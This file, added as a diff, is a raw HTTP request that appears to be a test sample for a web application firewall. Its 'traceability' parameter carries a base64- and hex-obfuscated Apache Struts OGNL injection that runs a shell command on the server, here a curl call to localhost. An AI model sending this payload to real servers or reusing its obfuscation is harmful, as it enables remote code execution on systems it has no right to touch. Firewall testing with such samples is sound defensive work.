@@ -1,0 +1,13 @@
+GET /retrospective/impression/declarative/respective?traceability=KCNjb250ZXh0PSNhdHRyWydceDczJysnXHg3NCcrJ1x4NzInKydceDc1JysnXHg3NCcrJ1x4NzMnKydceDJlJysnXHg3NicrJ1x4NjEnKydceDZjJysnXHg3NScrJ1x4NjUnKydceDUzJysnXHg3NCcrJ1x4NjEnKydceDYzJysnXHg2YicgXS5jb250ZXh0KS4oI2NvbnRleHQuc2V0TWVtYmVyQWNjZXNzKEBvZ25sLk9nbmxDb250ZXh0QERFRkFVTFRfTUVNQkVSX0FDQ0VTUykpLihAamF2YS5sYW5nLlJ1bnRpbWVAZ2V0UnVudGltZSgpLmV4ZWMoJ1x4NjMnKydceDc1JysnXHg3MicrJ1x4NmMnKydceDIwJysnXHgzMScrJ1x4MzInKydceDM3JysnXHgyZScrJ1x4MzAnKydceDJlJysnXHgzMCcrJ1x4MmUnKydceDMxJysnXHgzYScrJ1x4MzknKydceDMwJysnXHgzMCcrJ1x4MzEnICkp HTTP/1.1
+Host: waf-ce.chaitin.cn
+Cache-Control: no-cache
+Pragma: no-cache
+Accept: */*
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Connection: keep-alive
+Content-Length: 0
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (X11; CrOS x86_64 6680.78.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.102 Safari/537.36
+Cookie: marry=subtle; debug=registry; parse=integrity; SESSIONID=959811a05e1a7dd8f21d5bf9a25eb72c21b7c392bad47608ce31133d9d103689b2d65d7fe35a8e6529f5ea0c4a316861
+
